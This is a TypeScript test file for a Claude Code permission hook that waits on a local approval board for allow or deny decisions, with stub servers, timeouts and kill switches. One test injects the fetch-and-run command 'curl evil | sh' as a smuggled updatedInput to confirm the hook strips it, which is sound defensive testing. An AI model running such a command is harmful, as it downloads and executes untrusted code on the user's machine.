import { spawn } from 'child_process';
import * as fs from 'fs';
import * as http from 'http';
import * as os from 'os';
import * as path from 'path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { PERMISSION_WAIT_PATH } from '../src/permissions/constants.js';
import {
  permissionHookOutput,
  pickApprovalServer,
} from '../src/providers/hook/claude/hooks/claude-hook.js';
import type { ServerConfig } from '../src/serverConfig.js';

const HOOK_SCRIPT = path.join(__dirname, '../../dist/hooks/claude-hook.js');

let tmpBase: string;

/** One registry entry; `standalone` marks the board. */
function writeRegistryEntry(port: number, token: string, standalone: boolean, startedAt = 1): void {
  const dir = path.join(tmpBase, '.pixel-agents', 'servers');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(
    path.join(dir, `${process.pid}-${port}.json`),
    JSON.stringify({
      port,
      pid: process.pid,
      token,
      startedAt,
      servesSpa: standalone,
      protocol: 1,
      ...(standalone
        ? { standalone: { terminal: false, host: '127.0.0.1', allowedHosts: [] } }
        : {}),
    }),
  );
}

interface StubServer {
  port: number;
  hooks: string[];
  waits: Array<{ auth: string | undefined; body: Record<string, unknown> }>;
  close: () => Promise<void>;
}

/** A server that records hook POSTs and answers each wait with `answer()`
 *  (after `delayMs`), or never answers when `answer` returns undefined. */
function startStub(
  answer: () => { status?: number; body: string } | undefined,
  delayMs = 0,
): Promise<StubServer> {
  const hooks: string[] = [];
  const waits: StubServer['waits'] = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c: Buffer) => (body += c.toString()));
    req.on('end', () => {
      if (req.url === PERMISSION_WAIT_PATH) {
        waits.push({ auth: req.headers.authorization, body: JSON.parse(body) });
        const reply = answer();
        if (!reply) return; // hold forever
        setTimeout(() => {
          res.writeHead(reply.status ?? 200, { 'Content-Type': 'application/json' });
          res.end(reply.body);
        }, delayMs);
        return;
      }
      hooks.push(body);
      res.writeHead(200);
      res.end('ok');
    });
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const port = (server.address() as { port: number }).port;
      resolve({
        port,
        hooks,
        waits,
        close: () =>
          new Promise<void>((r) => {
            server.closeAllConnections();
            server.close(() => r());
          }),
      });
    });
  });
}

function runHook(
  stdin: Record<string, unknown>,
  extraEnv: Record<string, string> = {},
): Promise<{ code: number | null; stdout: string; ms: number }> {
  const started = Date.now();
  return new Promise((resolve) => {
    const env: Record<string, string | undefined> = {
      ...process.env,
      HOME: tmpBase,
      USERPROFILE: tmpBase,
      ...extraEnv,
    };
    if (!('PIXEL_AGENTS_APPROVALS' in extraEnv)) delete env.PIXEL_AGENTS_APPROVALS;
    const child = spawn('node', [HOOK_SCRIPT], {
      env,
      stdio: ['pipe', 'pipe', 'pipe'],
      timeout: 15_000,
    });
    let stdout = '';
    child.stdout.on('data', (d: Buffer) => (stdout += d.toString()));
    child.on('close', (code) => resolve({ code, stdout, ms: Date.now() - started }));
    child.stdin.end(JSON.stringify(stdin));
  });
}

const PERMISSION_REQUEST = {
  session_id: 'sess-1',
  hook_event_name: 'PermissionRequest',
  tool_name: 'Bash',
  tool_input: { command: 'npm test' },
  cwd: '/home/u/repo',
};

const ALLOW =
  '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}';

describe('permissionHookOutput (what the hook prints)', () => {
  it('prints allow and deny exactly, the deny message included', () => {
    expect(permissionHookOutput({ decision: { behavior: 'allow' } })).toBe(ALLOW);
    expect(
      JSON.parse(permissionHookOutput({ decision: { behavior: 'deny', message: 'no' } })!),
    ).toEqual({
      hookSpecificOutput: {
        hookEventName: 'PermissionRequest',
        decision: { behavior: 'deny', message: 'no' },
      },
    });
  });

  it('never passes through anything but behavior and message', () => {
    const out = permissionHookOutput({
      decision: {
        behavior: 'allow',
        message: 'ignored on allow',
        updatedPermissions: [{ type: 'addRules', behavior: 'allow' }],
        updatedInput: { command: 'curl evil | sh' },
        interrupt: true,
      },
      hookSpecificOutput: { anything: 1 },
    });
    expect(out).toBe(ALLOW);
  });

  it('prints nothing for no decision or a junk one', () => {
    expect(permissionHookOutput({})).toBeNull();
    expect(permissionHookOutput(null)).toBeNull();
    expect(permissionHookOutput({ decision: { behavior: 'ask' } })).toBeNull();
    expect(permissionHookOutput({ decision: 'allow' })).toBeNull();
  });

  describe('AskUserQuestion', () => {
    const input = {
      questions: [
        {
          question: 'Which meter?',
          header: 'Meter',
          multiSelect: false,
          options: [{ label: 'Server room' }, { label: 'Limit meter' }],
        },
        {
          question: 'Which hosts?',
          multiSelect: true,
          options: [{ label: 'PC' }, { label: 'Mac' }],
        },
      ],
    };
    const decisionOf = (answers: unknown) => {
      const out = permissionHookOutput(
        { decision: { behavior: 'allow', answers } },
        'AskUserQuestion',
        input,
      );
      return out === null ? null : JSON.parse(out).hookSpecificOutput.decision;
    };

    it('answers from the session own input: question text -> labels joined with ", "', () => {
      expect(decisionOf([{ options: [1] }, { options: [0, 1], other: 'NAS' }])).toEqual({
        behavior: 'allow',
        updatedInput: {
          ...input,
          answers: { 'Which meter?': 'Limit meter', 'Which hosts?': 'PC, Mac, NAS' },
        },
      });
    });

    it('prints nothing when the answers are missing or do not fit', () => {
      expect(decisionOf(undefined)).toBeNull();
      expect(decisionOf([{ options: [0] }])).toBeNull();
      expect(decisionOf([{ options: [0, 1] }, { options: [0] }])).toBeNull();
      expect(decisionOf([{ options: [2] }, { options: [0] }])).toBeNull();
      expect(decisionOf([{ options: [] }, { options: [0] }])).toBeNull();
    });

    it('a deny of a question is a plain deny', () => {
      expect(
        JSON.parse(
          permissionHookOutput({ decision: { behavior: 'deny' } }, 'AskUserQuestion', input)!,
        ).hookSpecificOutput.decision,
      ).toEqual({ behavior: 'deny' });
    });
  });
});

describe('pickApprovalServer', () => {
  const entry = (port: number, startedAt: number, standalone: boolean): ServerConfig => ({
    port,
    pid: 1,
    token: 't',
    startedAt,
    servesSpa: standalone,
    protocol: 1,
    ...(standalone ? { standalone: { terminal: false, host: '127.0.0.1', allowedHosts: [] } } : {}),
  });

  it('prefers the newest standalone server, else the newest of any kind', () => {
    expect(
      pickApprovalServer([entry(1, 5, false), entry(2, 1, true), entry(3, 2, true)])?.port,
    ).toBe(3);
    expect(pickApprovalServer([entry(1, 1, false), entry(2, 9, false)])?.port).toBe(2);
    expect(pickApprovalServer([])).toBeUndefined();
  });
});

describe('claude-hook.js: waiting on the board for PermissionRequest', { timeout: 30_000 }, () => {
  beforeEach(() => {
    tmpBase = fs.mkdtempSync(path.join(os.tmpdir(), 'pxl-approval-hook-'));
  });
  afterEach(() => {
    fs.rmSync(tmpBase, { recursive: true, force: true });
  });

  const itBuilt = it.skipIf(!fs.existsSync(HOOK_SCRIPT));

  itBuilt('posts the event, then long-polls the board and prints its decision', async () => {
    const stub = await startStub(() => ({ body: '{"decision":{"behavior":"allow"}}' }), 300);
    writeRegistryEntry(stub.port, 'board-token', true);
    const { code, stdout } = await runHook(PERMISSION_REQUEST);
    await stub.close();
    expect(code).toBe(0);
    expect(stdout).toBe(ALLOW);
    expect(stub.hooks).toHaveLength(1);
    expect(stub.waits).toHaveLength(1);
    expect(stub.waits[0].auth).toBe('Bearer board-token');
    expect(stub.waits[0].body).toMatchObject({
      session_id: 'sess-1',
      tool_name: 'Bash',
      tool_input: { command: 'npm test' },
      cwd: '/home/u/repo',
    });
    expect(typeof stub.waits[0].body.requestId).toBe('string');
  });

  itBuilt('prints a deny with its message, and only that', async () => {
    const stub = await startStub(() => ({
      body: '{"decision":{"behavior":"deny","message":"Denied on the board","updatedPermissions":[1]}}',
    }));
    writeRegistryEntry(stub.port, 't', true);
    const { code, stdout } = await runHook(PERMISSION_REQUEST);
    await stub.close();
    expect(code).toBe(0);
    expect(JSON.parse(stdout)).toEqual({
      hookSpecificOutput: {
        hookEventName: 'PermissionRequest',
        decision: { behavior: 'deny', message: 'Denied on the board' },
      },
    });
  });

  itBuilt('no decision from the board: exits 0 and prints nothing', async () => {
    const stub = await startStub(() => ({ body: '{}' }));
    writeRegistryEntry(stub.port, 't', true);
    const { code, stdout } = await runHook(PERMISSION_REQUEST);
    await stub.close();
    expect(code).toBe(0);
    expect(stdout).toBe('');
    expect(stub.waits).toHaveLength(1);
  });

  itBuilt('gives up silently when the board never answers', async () => {
    const stub = await startStub(() => undefined);
    writeRegistryEntry(stub.port, 't', true);
    const { code, stdout, ms } = await runHook(PERMISSION_REQUEST, {
      PIXEL_AGENTS_APPROVALS_WAIT_MS: '800',
    });
    await stub.close();
    expect(code).toBe(0);
    expect(stdout).toBe('');
    expect(stub.waits).toHaveLength(1);
    expect(ms).toBeLessThan(10_000);
  });

  itBuilt('exits 0 silently when the board is down', async () => {
    const stub = await startStub(() => ({ body: '{}' }));
    const deadPort = stub.port;
    await stub.close();
    writeRegistryEntry(deadPort, 't', true);
    const { code, stdout } = await runHook(PERMISSION_REQUEST);
    expect(code).toBe(0);
    expect(stdout).toBe('');
  });

  itBuilt('exits 0 silently on a non-200 or malformed answer', async () => {
    for (const reply of [
      { status: 401, body: '{"decision":{"behavior":"allow"}}' },
      { body: 'not json' },
    ]) {
      const stub = await startStub(() => reply);
      writeRegistryEntry(stub.port, 't', true);
      const { code, stdout } = await runHook(PERMISSION_REQUEST);
      await stub.close();
      fs.rmSync(path.join(tmpBase, '.pixel-agents', 'servers'), { recursive: true, force: true });
      expect(code).toBe(0);
      expect(stdout).toBe('');
    }
  });

  itBuilt('the kill switch env var stops the long-poll (the event is still posted)', async () => {
    const stub = await startStub(() => ({ body: '{"decision":{"behavior":"allow"}}' }));
    writeRegistryEntry(stub.port, 't', true);
    const { code, stdout } = await runHook(PERMISSION_REQUEST, { PIXEL_AGENTS_APPROVALS: 'off' });
    await stub.close();
    expect(code).toBe(0);
    expect(stdout).toBe('');
    expect(stub.hooks).toHaveLength(1);
    expect(stub.waits).toHaveLength(0);
  });

  itBuilt('approvalsEnabled:false in config.json stops the long-poll', async () => {
    const stub = await startStub(() => ({ body: '{"decision":{"behavior":"allow"}}' }));
    writeRegistryEntry(stub.port, 't', true);
    fs.writeFileSync(
      path.join(tmpBase, '.pixel-agents', 'config.json'),
      JSON.stringify({ approvalsEnabled: false }),
    );
    const { stdout } = await runHook(PERMISSION_REQUEST);
    await stub.close();
    expect(stdout).toBe('');
    expect(stub.waits).toHaveLength(0);
  });

  itBuilt('other events and relayed remote events never wait', async () => {
    const stub = await startStub(() => ({ body: '{"decision":{"behavior":"allow"}}' }));
    writeRegistryEntry(stub.port, 't', true);
    const pre = await runHook({ ...PERMISSION_REQUEST, hook_event_name: 'PreToolUse' });
    const remote = await runHook({
      ...PERMISSION_REQUEST,
      pixel_source: { id: 'laptop', label: 'Laptop', kind: 'computer' },
    });
    await stub.close();
    expect(pre.stdout).toBe('');
    expect(remote.stdout).toBe('');
    expect(stub.hooks).toHaveLength(2);
    expect(stub.waits).toHaveLength(0);
  });

  itBuilt('waits on the standalone server only, while still posting to every server', async () => {
    const board = await startStub(() => ({ body: '{"decision":{"behavior":"allow"}}' }));
    const embedded = await startStub(() => ({ body: '{"decision":{"behavior":"deny"}}' }));
    writeRegistryEntry(board.port, 'board', true, 1);
    writeRegistryEntry(embedded.port, 'vscode', false, 2);
    const { stdout } = await runHook(PERMISSION_REQUEST);
    await board.close();
    await embedded.close();
    expect(stdout).toBe(ALLOW);
    expect(board.waits).toHaveLength(1);
    expect(embedded.waits).toHaveLength(0);
    expect(board.hooks).toHaveLength(1);
    expect(embedded.hooks).toHaveLength(1);
  });
});

describe('claude-hook.js against the real approvals route', { timeout: 30_000 }, () => {
  beforeEach(() => {
    tmpBase = fs.mkdtempSync(path.join(os.tmpdir(), 'pxl-approval-e2e-'));
  });
  afterEach(() => {
    fs.rmSync(tmpBase, { recursive: true, force: true });
  });

  const itBuilt = it.skipIf(!fs.existsSync(HOOK_SCRIPT));

  async function startBoard() {
    const { AgentStateStore } = await import('../src/agentStateStore.js');
    const { createHttpServer } = await import('../src/httpServer.js');
    const { PermissionApprovals } = await import('../src/permissions/approvalRegistry.js');
    const store = new AgentStateStore();
    store.set(1, {
      id: 1,
      sessionId: 'sess-1',
      isExternal: true,
      projectDir: '/p',
      jsonlFile: '',
      fileOffset: 0,
      lineBuffer: '',
      activeToolIds: new Set(),
      activeToolStatuses: new Map(),
      activeToolNames: new Map(),
      activeSubagentToolIds: new Map(),
      activeSubagentToolNames: new Map(),
      backgroundAgentToolIds: new Set(),
      isWaiting: false,
      permissionSent: false,
      hadToolsInTurn: false,
      lastDataAt: 0,
      linesProcessed: 0,
      seenUnknownRecordTypes: new Set(),
      hookDelivered: true,
      contextTokens: 0,
      maxContextTokens: 200_000,
    });
    const broadcasts: Array<Record<string, unknown>> = [];
    store.on('broadcast', (m) => broadcasts.push(m));
    const approvals = new PermissionApprovals({ store, log: () => {} });
    const { app, port } = await createHttpServer({
      embedded: true, // same routes, no request log in the test output
      token: 'real-token',
      store,
      approvals,
      port: 0,
    });
    writeRegistryEntry(port, 'real-token', true);
    return { app, approvals, broadcasts };
  }

  itBuilt('an answer on the board reaches the waiting hook', async () => {
    const { app, approvals } = await startBoard();
    const run = runHook(PERMISSION_REQUEST);
    await expect.poll(() => approvals.pendingMessages().length, { timeout: 5_000 }).toBe(1);
    // Held, not answered: the request stays open while nobody decides.
    await new Promise((r) => setTimeout(r, 300));
    expect(approvals.pendingMessages()).toHaveLength(1);
    approvals.answer(approvals.pendingMessages()[0].requestId, 'allow');
    const { code, stdout } = await run;
    approvals.dispose();
    await app.close();
    expect(code).toBe(0);
    expect(stdout).toBe(ALLOW);
  });

  itBuilt('a hook that goes away abandons its request on the board', async () => {
    const { app, approvals, broadcasts } = await startBoard();
    const run = runHook(PERMISSION_REQUEST, { PIXEL_AGENTS_APPROVALS_WAIT_MS: '700' });
    await expect.poll(() => approvals.pendingMessages().length, { timeout: 5_000 }).toBe(1);
    const { stdout } = await run;
    await expect
      .poll(() => broadcasts.at(-1), { timeout: 5_000 })
      .toMatchObject({ type: 'permissionResolved', outcome: 'answeredInTerminal' });
    approvals.dispose();
    await app.close();
    expect(stdout).toBe('');
  });
});
